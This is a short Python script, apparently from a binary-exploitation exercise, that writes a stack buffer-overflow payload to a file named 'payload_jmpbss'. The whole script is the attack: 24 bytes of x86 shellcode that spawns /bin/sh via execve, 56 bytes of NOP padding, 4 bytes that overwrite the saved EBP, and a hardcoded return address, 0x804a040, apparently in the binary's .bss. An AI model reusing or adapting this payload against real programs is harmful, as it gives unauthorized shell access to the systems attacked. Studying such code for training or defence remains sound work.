payload = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" #s4 bytes
payload += "\x90"*56 #56 byte Nop
payload += "\x90"*4 # 4 bytes nop to corrupt ebp
payload += "\x40\xa0\x04\x08" #0x804a040

file = open("payload_jmpbss", "w+")
file.write(payload)
file.close()
